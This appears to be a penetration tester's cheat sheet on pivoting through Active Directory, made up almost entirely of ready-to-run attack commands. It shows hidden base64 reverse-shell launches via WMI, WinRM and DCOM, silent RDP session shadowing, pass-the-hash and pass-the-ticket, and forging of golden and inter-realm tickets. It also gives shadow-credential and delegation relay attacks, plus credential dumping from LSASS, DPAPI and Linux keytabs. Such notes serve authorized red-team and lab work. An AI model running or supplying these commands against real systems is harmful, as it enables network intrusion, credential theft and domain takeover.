---
layout: blank
pagetitle: Pivoting via Active Directory
---

Useful when we can't install something like ligolo and pivot to compromise an internal machine

## Service Pivoting

**Windows Management Instrumentation**
- Facilitates task automation via creating processes
- Uses Remote Procedure Calls (RPC) over 135 for remote access
- Abusing `wmic` (recently deprecated, but still probably good) on DMZ
	- `wmic /node:{target_IP} /user:{domain_user} /password:{password} process call create "{process}"`
	- To use with powershell, we need to turn the password into a secure string and pass a reverse shell:

```Powershell
$username = '{domain_user}';
$password = '{password}';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName {target_IP} -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e {reverse_shell_powershell_b64}';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

**WinRM**
- Communicates over 5986 and 5985 with XML via HTTP/HTTPS
- Use with `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "cmd /c {command}"` or `winrs -r:{target_dnshostname} -u:{domain_user} -p:{password} "powershell -nop -w hidden -e {reverse_shell_powershell_base64}"`
- Can also be done via powershell

**DCOM**
- Good for lateral movement
- Exploits the Distributed Component Object Model (DCOM)
	- Used for creating software components that interact with each other
	- Local administrator access required
- Lateral movement attacks documented by [cybereason](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
- Performed using built-in CreateInstance
	- `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","{target_IP}"))` 
	- `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"{powershell -nop -w hidden -e {reverse_shell_powershell_base64}}","7")`


```Powershell
$username = '{domain_user}';
$password = '{password}';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName {target} -Credential $credential
Enter-PSSession {PSSession_ID_returned}
```

**PsExec**
- Tool used to replace telnet-like applications and provide remote execution of processes
- From [PsTools](https://download.sysinternals.com/files/PSTools.zip)
- Requires:
	- Local Administrator
	- `ADMIN$` share available (on by default)
	- File and Printer sharing (on by default)
- `./PsExec64.exe -i  \\{dnshostname} -u {domain}\{domain_user} -p {password} cmd`
- Get SYSTEM shell: `PsExec.exe -i -s cmd.exe`

**SMB**
- Domain trusts can be abused to view internal SMB shares
  - `net view //{dnshostname_or_IP} /all`

**Outbound RDP sessions**
- Assume a user has RDP'd into another system from an owned box
- We can shadow the existing sessions using the following as Administrator:
  - `reg add "\\LOCALHOST\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow /T REG_DWORD /D 4 /F`
  - `query user`
    - Find the ID of the user session to shadow
  - `mstsc /shadow:4 /noConsentPrompt`

## NTLM/Kerberos Pivoting

**Overpass the Hash**
- Use an NTLM user hash to gain a full Kerberos TGT to get a TGS
- Assumes we own a server that has a domain user's hash
- This can act as `RunAs` but for a domain user's hash 
- Performed using Mimikatz
	- `sekurlsa::pth /user:{domain_user} /domain:{domain} /ntlm:{compromised_hash} /run:powershell`
- To get a Kerberos ticket, we run something in the new powershell window 
	- `net use \\files04`
- Once we have the ticket, we can just use PsExec to run commands on the remote systems using the compromised user
	- `PsExec.exe \\{dnshostname} powershell`
	- This only worked as the _ACTUAL_ `Administrator` local user, not just an administrative user
		- Need to be able to write to C:\Windows
		- We can just change the local Administrator user if we have an administrative user

**Pass the Ticket**
- We can use `nxc` to do it automatically for us
  - `nxc smb {machine_FQDN} -u {username} -p {password} -k -x {command_to_execute}`
- TGTs only work on the machine they're created for, whereas TGSs offer flexibility
- Export current in-memory tickets with `sekurlsa::tickets /export`
	- This exports all tickets in `.kirbi` format in the same file directory, ls to find the ticket names (among other info)
	- We can then pick the desired ticket by passing the ticket name
		- `kerberos::ptt {ticket_name}`
	- If using these to access file shares, running something like `ls \\web04\` will just give an error. Type `ls \\web04\` and press tab (or just `Find-DomainShare` with PowerView)
- **Rubeus**
  - [Compiled binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
  - Dumping and using tickets is one of Rubeus's strong suits
  - `Rubeus.exe triage` to list available tickets

**Changing Users**
- If only one of our users can remote into the system, but we want to operate as another user, we can use [RunasCs](https://github.com/antonioCoco/RunasCs)
- This is built on top of the base `runas.exe` and handles much better
  - `RunasCs.exe {username} {password} {cmd} -d {domain} -r {host:port} `
    - Also has `--bypass-uac`
- Compiled executable in releases zip: [https://github.com/antonioCoco/RunasCs/releases/tag/v1.5](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)

**Shadow Credentials**
- Seems certipy is the go-to here: `certipy shadow -u "{user}@{domain}" -p {password} -dc-ip {dc_ip} -account '{target_user}' auto`
- If we have GenericWrite over a user from a group
  - If we need to add ourselves or a user to the group first via GenericAll, we can use `net` on kali
  	- `net rpc group addmem '{target_group}' {user_to_add} -U '{domain}/{owned_user}%{password} -S '{dc_fqdn}'`
      - This has sometimes failed for me in the past, so we can also use `bloodyAD`
        - `bloodyAD --host '{ip}' -d '{domain}' -u {user} -p '{password}' add groupMember {group} {user_to_add}`
  - We can then use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to add shadow credentials to the user
	- `pywhisker -d "{domain}" -u "{owned_user}" -p "{owned_user_password}" --target "{target_user}" --action "add" --dc-ip {dc-ip} -f {filename} --pfx-password '{pfx_file_password}'`
	- This gives us a pfx file for the user and a password for the pfx file
  - Then, we use the pfx file with [gettgtpkinit](https://github.com/dirkjanm/PKINITtools) to get a ccache kerberos TGT
	- `gettgtpkinit.py -cert-pfx {pfx_file} "{domain}/{target_user}" {user}.ccache -pfx-pass '{pfx_pass}' -dc-ip {dc_ip}`
	- We could also use certipy, which gives us the user's NTLM hash as well
	  - `certipy auth -pfx {pfx_file} -dc-ip {dc-ip} -domain {domain_name} -username {target_user}`
	  	- Add `-no-save` if we don't want the ccache file

- **Finding Deleted Objects**
  - Sometimes there can be interesting AD objects that have been deleted which we can use
  - `Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects` to list deleted objects
    - This will list objects deleted in chronological order, so we can restore the same deleted objects multiple times
    - If we've imported PowerView, this will fail due to having a different `Get-ADObject`
  - We can then restore the object with `Restore-ADObject -Identity "{object_GUID}"`
    - We can undo this with `Remove-ADObject -Identity "{object_GUID}" -Recursive -Confirm:$false`

**Abusing Domain Trusts**
- Remember here that since we're using kerberos we have to use DNS instead of IPs
- Getting SIDs
	- Domain SIDs are often needed for tickets, so we use impacket's `lookupsid.py`
		- `lookupsid.py -domain-sids {domain_user_domain}/{domain_user}:{password}@{target_dc_IP} 0`
- Golden ticket using child domain
  - If a parent domain trusts us as a child domain, we can use this to create a golden ticket with SIDs in the ticket's Privilege Attribute Certificate (PAC)
    - Netexec now actually supports this with `-M raisechild`
      - `nxc ldap {child_dc_IP} -u {username} -p {password} -M raisechild`
  - `ticketer.py` can use `krbtgt`'s nthash to create a golden ticket
    - `ticketer.py -nthash {child_krbtgt_nthash} -domain {child_domain} -domain-sid {child_domain_sid} -extra-sid {parent_domain_sid}-519 fakeuser`
      - To get the parent domain's sid, we can use `Get-ADDomain -Identity {domain_name}`
      - To use the ticket, we may need to save it with `export KRB5CCName={path_to_ticket}`, but I think impacket will recognize it in our directory for the specified user
    - We can then use the ticket to `secretsdump` or `psexec`
      - `secretsdump.py -k -no-pass {child_domain}/fakeuser@{parent_domain_machine_name}`
	  - This works because we've forged a TGT that was valid for our child domain with the parent domain listed as an additional SID on the ticket, we can directly authenticate and access resources
- Forging inter-realm TGT and getting a service ticket
  - We can also extract the trust key and use it to create our own TGT
  - `ticketer.py -nthash {DOMAIN$_NTLM_trust_hash} -domain {child_domain} -domain-sid {child_domain_sid} -extra-sid {parent_domain_sid}-519 -spn krbtgt/{parent_domain_name} fakeuser`
	- The domain NTLM trust hash will look like `SEVENKINGDOMS$:1104:{hash}:::`
	- Then, export the ticket to be used for kerberos auth with `export KRB5CCName={path_to_ticket}`
  - We can then use this TGT to request a service ticket using `getST.py`
	- `getST.py -k -no-pass -spn {spn}/{parent_domain_computer_name} '{parent_domain}/fakeuser@{parent_domain}' -debug`
		- The spn value can be many different things, depending on what service we'd like to request:
			- HOST for general host access, CIFS for SMB, LDAP for ldap, GC for Global Catalog, RPCSS for  RPC, MSSQLSvc for MSSQL, HTTP for web, WSMAN for PowerShell remoting
	- Since this is an interrealm service-key, it doesn't provide access to services yet, so we can use it to request one of the above services from the DC
  - We then export this new ST, and we can use it to authenticate directly to the parent domain controller
	- `secretsdump.py -k -no-pass fakeuser@kingslanding.sevenkingdoms.local`
	  - This would require a `cifs/` service ticket, as dumping secrets is done through SMB

**ACL Abuse**
- Check out [OUned](https://github.com/synacktiv/OUned) for a pretty neat enumeration tool

## Delegation
- Resource-based Constrained Delegation (RBCD) is basically allowing one entity to perform some action on behalf of another user
- It's very useful for giving granular permissions, for example if a service user needs to access only some resources on behalf of another user
- Alice delegating to Bob means that Bob can request Kerberos tickets and access services on behalf of Alice

**Abusing Delegation to a Machine We Control**
- `ntlmrelayx` supports providing delegation to our owned computer accounts with `--delegate-access`
  - This means that the target computer will delegate to our newly-created computer
- An example attack path:
  - Coerce a computer to authenticate to us (or gather relayable credentials in some manner): 
    - `coercer coerce -l {our_IP} -t {target_IP} --always-continue -u {username} -p {password}`
  - Set up `ntlmrelayx` to add a computer to the domain using the relayed credentials which the coerced machine has delegation rights over:
    - `ntlmrelayx.py -t ldaps://{dc_IP} -smb2support --remove-mic --add-computer {new_computer_name} --delegate-access`
  - Use new computer to request a TGS from the machine's Administrator via our new delegation 
    - `getST.py -spn HOST/{target_machine_name}.{domain} -impersonate Administrator -dc-ip {dc_ip} '{domain}/{new_computer_name}:{new_computer_pass}'`
  - Use the valid TGS to extract secrets from the target machine:
    - `export KRB5CCNAME=./Administrator.ccache; secretsdump.py -k -no-pass {domain}/Administrator@{target_ip}`

## Credential Harvesting

**Secrets Dumping**
- Sometimes Impacket's secretsdump won't work if we can't hit the right ports on the machine
- If we have a shell, though, we can use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
  - Download the [zip](https://github.com/MichaelGrafnetter/DSInternals/releases/latest), import with `Import-Module DSInternals.psd1`, and run `Get-ADReplAccount -All -Server LOCALHOST`
- No issues with defender, as it can be used for normal administrative tasks

**Getting More Credentials**
- `vault::cred /patch` will enumerate vault credentials (creds used in scheduled tasks)

**Active Session Credential Dumping**
- [DumpGuard](https://github.com/bytewreck/DumpGuard) seems to be able to dump LSASS without actually touching LSASS memory, using the Remote Credential Guard protocol
  - Compiled version here: https://khaelkugler.com/misc_scripts/DumpGuard.exe
  - Will need system, so use PsExec: https://khaelkugler.com/misc_scripts/PsExec.exe
    - `PsExec.exe -i -s cmd.exe`
  - Usage: `DumpGuard.exe /mode:all`
    - Can add `/domain:{DOMAIN}`, `/username:{SAMACCOUNTNAME}`, `/password:{PASSWORD}`, `(/spn:{SPN})`

**DPAPI Keys**
- Master encryption keys used by the Data Protection API (DPAPI) to encrypt data like passwords/certs
- Derived from logon passwords, meaning they can be decrypted with the password (or Administrator access)
  - Will be created/used by different processes, such as Chromium browsers, SCCM, Task Scheduler
- We'll find the master key in `~\AppData\Roaming\Microsoft\Protect\{user_SID}\`, which we can decrypt using impacket:
  - `dpapi.py masterkey -file {masterkey_file} -sid {user_SID} -password '{user_password}'`
- We can then use the masterkey to decrypt credentials, which are commonly found in `~\Appdata\(Roaming/Local)\Microsoft\Credentials\` again using impacket:
  - `dpapi.py credential -file {credential_file} -key '0x{master_key}'`
- NetExec can also perform this process automated with `nxc smb --dpapi cookies`

## Abusing AD-joined Linux

- Automated enumeration: [linikatz](https://github.com/CiscoCXSecurity/linikatz.git)
  - Will check for common avenues, like saved kerberos tickets

**Common sources of credentials**
- Winbind config in Samba configuration: `/etc/samba/smb.conf`
- Kerberos authentication config file: `/etc/krb5.conf`
- Private key in `/var/lib/sss/secrets/.secrets.mkey`
- Kerberos keys in
  - `/tmp/krb5_[uid]`
  - `/etc/krb5.keytab`
- If we have root, can go into the `/var/lib/samba/secrets` folder and look for these files:
  - `secrets.tdb` - Contains domain secrets, machine account passwords
  - `passdb.tdb` or `smbpasswd` - User password hashes
  - `krb5.keytab` - Kerberos keytab if domain-joined
  	- Then run `pdbedit -L -w` to output in smbpasswd format (LM:NT hashes)

**Keytabs**
- Sometimes used to authenticate Linux boxes to Kerberos
- Get current users tokens with `klist`
- List keytab contents with `klist -k /etc/kr5.keytab`
- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) can extract NTLM hashes from these

**Kerberos TGTs**
- If a new kerberos TGT was added, we can use `kvno` (from `krb5-user`)
- On victim: `kvno krbtgt/example.com --out-cache /tmp/kvno_tgt; cat /tmp/kvno_tgt | base64`
- On kali: Paste b64 into a file and then `cat /tmp/kvno_tgt.b64 | base64 -d > /tmp/kvno_tgt`
- Should be able to then export with `KRB5CCNAME=/tmp/kvno_tgt`